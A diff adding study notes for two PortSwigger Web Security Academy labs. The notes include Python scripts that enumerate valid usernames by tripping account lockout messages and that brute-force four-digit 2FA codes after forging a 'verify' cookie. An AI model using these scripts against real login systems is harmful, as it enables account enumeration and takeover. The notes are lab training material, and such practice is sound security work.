@@ -49,5 +49,68 @@ us_t.close()
 ```
 
 ## Lab: Username enumeration via account lock
+- First check with username is valid. In this lab, different message is gived, check response text length.
+- Brute force password. (this lab is easy, without REAL account lock.)
 
+```python
+usf = open("usernames", "r")
+usernames = usf.readlines() 
 
+import requests
+
+url = 'https://1a7c0051045b95cf81b74d4c0034003f.web-security-academy.net/login'
+for user in usernames:
+    for i in range(5):
+        data = {
+            'username': user[:-1], # IMPORTANT!! [:-1]! WITHOUT breaklines.
+            'password': 'whatever'
+        }
+        response = requests.post(url, data=data)
+
+        print(f"Status Code: {response.status_code}", end='. ')
+        # print(f"Response Content: {response.text}")
+        # print(user, end='')
+        print(len(response.text), end=".")
+        if ("Invalid username or password." in response.text):
+            # print("Invalid username or password")
+            print(user)
+        elif ("You have made too many incorrect login attempts" in response.text):
+            print("Also Found it: ", user)
+        else:
+            print("Found it: ", user)
+```
+
+## Lab: 2FA broken logic
+
+Bypass:
+1. change 2FA Code request cookie, `verify=carlos`
+2. brute-force 2FA Code validation request:
+
+```python
+import requests
+
+url = 'https://0afc00e803f4920e81f98935000a005d.web-security-academy.net/login2'
+
+# Cookies
+cookies = {
+    'verify': 'carlos',
+    'session': 'eErTh9MMiwoQBuIpyzr00GPQULR0tZKe'
+}
+
+for i in range(191, 9999):
+    string = f"{i:04d}"
+    # Data
+    data = {
+        'mfa-code': string,
+    }
+
+    # Make the POST request
+    response = requests.post(url, cookies=cookies, data=data)
+
+    # Print the response
+    # print(f"Status Code: {response.status_code}")
+    if ("Incorrect security code" not in response.text):
+        print("Found it.", string)
+    else:
+        print(string, end=" ")
+```
